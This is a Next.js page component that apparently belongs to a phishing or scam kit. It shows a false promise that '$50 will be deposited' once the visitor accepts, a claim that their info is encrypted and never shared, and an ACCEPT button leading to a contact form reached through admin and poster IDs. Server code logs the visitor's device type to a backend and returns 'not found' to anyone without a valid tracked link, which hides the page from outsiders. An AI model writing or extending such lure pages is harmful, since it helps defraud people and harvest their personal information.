import { useRouter } from "next/router";
import { API_URL, site } from "../../../config";
import { BsShieldFillCheck } from "react-icons/bs";
import Link from "next/link";

function HomePage() {
  const router = useRouter();
  const { adminId, posterId } = router.query;

  return (
    <div className="mx-3 lg:mx-[70px]">
      <div className="min-h-[calc(100vh-20px)] flex flex-col justify-between">
        <div className="mt-[45px] lg:container px-3 lg:px-0">
          <div className="text-[40px] text-custom-green">
            <BsShieldFillCheck />
          </div>
          <p className="mt-7 text-[25px]">
            $50 Will be deposited once You Accept the payment.
          </p>
        </div>
        <div className="">
          <p className="text-center text-[13px] text-slate-500 mb-4">
            Your info is encrypted and never shared
          </p>
          <Link href={`/${adminId}/${posterId}/contact`}>
            <button className="w-full text-lg bg-custom-green rounded-full py-3 text-white underline hover:no-underline">
              ACCEPT
            </button>
          </Link>
        </div>
      </div>
    </div>
  );
}

export async function getServerSideProps({
  req,
  query: { adminId, posterId },
}) {
  const userAgent = req.headers["user-agent"];

  const isMobileView = userAgent.match(
    /Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i
  );

  const isTabletView = userAgent.match(
    /Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i
  );

  const device = isMobileView ? "phone" : isTabletView ? "ipad" : "desktop";

  const url = `${API_URL}/${site}/verify/${adminId}/${posterId}/${device}`;

  const res = await fetch(url);
  const data = await res.json();

  if (data?.success !== "exists") {
    return {
      notFound: true,
    };
  }

  return {
    props: {},
  };
}

export default HomePage;
